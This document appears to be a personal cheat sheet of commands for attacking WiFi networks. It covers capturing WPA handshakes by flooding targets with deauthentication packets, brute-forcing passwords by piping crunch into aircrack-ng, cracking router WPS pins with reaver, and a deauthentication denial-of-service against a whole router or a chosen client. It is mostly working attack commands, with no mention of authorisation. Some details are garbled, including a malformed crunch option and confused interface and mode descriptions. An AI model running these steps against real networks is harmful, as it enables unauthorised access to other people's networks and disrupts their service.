1. There are different types of encryption in WiFi
2. `apt-get install aircrack-ng` : Install aircrack-ng, tool for wireless cracking
3. `apt-get install reaver` : Install reaver, tool to crack router pin. If reaver is not available, install it from 'reaver google code'
4. `apt-get install crunch` : Install crunch, tool for generating passwords
5. Different interfaces on mac:
    - lo0 is the loopback interface. This is used for the machine to refer to itself.
    - gif0 is the software network interface.
    - stf0 is the IPv6 to IPv4 interface.
    - gif0 is a tunnel interface for IPv4 to IPv6.
    - p2p0 is airdrop.
    - en0 is the WiFi interface.
    - en1 through en4 are the Thunderbolt interfaces, first through fourth.
    - bridge0 is the Thunderbolt bridge. typically for transfering files over cable between two Macs.
    - awdl0 is the Apple Wireless Direct Link, typically used for Hotspot functionality with iOS devices and your Apple computer.
    - ap1 is probably related to the above but I can’t confirm.
    - en5 is iBridge adapter for the TouchBar.
    - utunN are related to the sharing of information between devices on the same iCloud account. They can also be created by any VPN interfaces you’ve added.
6. In monitor mode, wireless network card accepts all the packets from other devices, while in normal (or promiscuous) mode, it
    accepts packets that are addressed to itself only
7. Steps to crack:
    - Set network wireless card to monitor mode. Use `ifconfig` to get the wireless card name
    - `ifconfig en0 down` : turn down wireless card
    - `iwconfig en0 mode monitor` : Set wireless card mode to monitor.
    - `ifconfig en0 up` : Start wireless card
    - `airmon-ng check en0` : It checks if any running processes might interfere with the cracking process.
    - If above command list any process, then kill those processes using kill command. Eg. NetworkManager, dhclient, `kill <PID>`
    - `airodump-ng en0` : Checks the available network connections nearby that are compatible to en0
    - In the output,
        - BSSID : mac address of the device
        - pwr : signal strength
        - CH : channel
        - ENC : encoding protocol
        - Cipher : Cipher algo used for encryption
        - AUTH : Authentication protocol
        - ESSID : name of wifi
    - Copy the BSSID and channel number for the target wireless network
    - `airodump-ng -c <target channel number> -w <outputfile> --bssid <target BSSID> en0` : Scans the network with 'BSSID' on channel 'channel number'
                            for interface 'en0' and writes the output to 'outputfile'
    - Above command displays target wireless network information and info related to the connected devices tagged as 'stations'
    - In another terminal: run `aireplay-ng -0 0 -a <target BSSID> en0` : It will send deauthentication request to the target device via interface en0.
                         0 means, deauthentication request will be sent infinite times.
    - Stop the deauthentication command after few minutes. And wait for 'WPA handshake' to appear on terminal with 'airodump' running
8. `aircrack-ng -w - outputfile -e <ESSID>` takes input from input stream and run the string on ESSID device to validate
                        if given string is correct password using the captured outputfile from airodump.
9. `crunch 10 11-t %%%%wonder 123456` :
    - It will generate all permutations of string that ends with wonder.
    - length og string is minimum 10 and maximum 11
    - % sign implies a single digit number to use in its place
    - '123456' is the list of numbers to use in '%' sign
10. Combining above two commands
    - `crunch 10 11 -t %%%%wonder 123456 | aircrack-ng -w - capturedoutputfile -e <ESSID>`
    - 'crunch' will generate all combinations of passwords and through '|' pipe, this list will go to 'aircrack' command
    - aircrack will check the string generated by crunch for potential password.
11. It's useful to know certain pattern of the password to reduce the cracking time

--------------------------------------------------------------------------------------------------------------------

Cracking router pin using reaver

1. Initial setup
    - Set network wireless card to monitor mode. Use `ifconfig` to get the wireless card name
    - `ifconfig en0 down` : turn down wireless card
    - `iwconfig en0 mode monitor` : Set wireless card mode to monitor.
    - `ifconfig en0 up` : Start wireless card
    - `airmon-ng check en0` : It checks if any running processes might interfere with the cracking process.
    - If above command list any process, then kill those processes using kill command. Eg. NetworkManager, dhclient, `kill <PID>`
    - `airodump-ng en0` : Checks the available network connections nearby that are compatible to en0.
    - Check the 'PWR' field in output from above command. if 'PWR' is less than approx -60, that reaver will work on it
2. Using 'wash' command to check if a router has WPS on or not
    - First check folder '/etc/reaver' exist or not, if not then create this folder
    - `wash -i en0` : checks for WPS on any available router using en0 interface
    - Output of above command is this :
        - BSSID : MAC address if the router
        - channel : frequency channel being used
        - RSSID
        - WPS Version
        - WPS locked
        - ESSID : Device name
3. Cracking the pin
    - `reaver -b <BSSID> -i en0 -c <channel> -r 2:60 -vv`
        - '-b' is flag for mac address
        - '-i' is flag for interface
        - '-c' is flag for channel
        - '-vv' is for double verbose,
        - '-r' is flag for number of retries. In this case, it's 2 retries per 60 sec
4. Pin generation:
    - Most of the router manufacturing companies uses certain algo to generate random permutations
    - Many hackers have reverse engineered the algo

--------------------------------------------------------------------------------------------------------------------

DoS attack on WiFi interface

1. Initial setup
    - Set network wireless card to monitor mode. Use `ifconfig` to get the wireless card name
    - `ifconfig en0 down` : turn down wireless card
    - `iwconfig en0 mode monitor` : Set wireless card mode to monitor.
    - `ifconfig en0 up` : Start wireless card
    - `airmon-ng check en0` : It checks if any running processes might interfere with the cracking process.
    - If above command list any process, then kill those processes using kill command. Eg. NetworkManager, dhclient, `kill <PID>`
    - `airodump-ng en0` : Checks the available network connections nearby that are compatible to en0.
    - Check the 'PWR' field in output from above command. if 'PWR' is less than approx -60, that reaver will work on it
2. Deauthentication
    - Copy the BSSID and channel number for the target wireless network
    - `airodump-ng -c <target channel number> -w <outputfile> --bssid <target BSSID> en0` : Scans the network with 'BSSID' on channel 'channel number'
                            for interface 'en0' and writes the output to 'outputfile'
    - Above command displays target wireless network information and info related to the connected devices tagged as 'stations'
    - In another terminal: run `aireplay-ng -0 0 -a <target BSSID> en0 ` : It will send deauthentication request to the target router via interface en0.
                         '-0 0' means deauthentication request will be sent infinite times.
    - `aireplay-ng -0 0 -a <target BSSID> en0 -c <client BSSID>` : Deauthenticate onle client specified by 'client BSSID'
3. In case, target devices has different channel than your own device
    - `iwconfig en0 channel 6  ` : It will change your own device channel to 6.
4. `airodump-ng en0` : It will display station ID and BSSID of the router they are connected to, for all the routers in the vicinity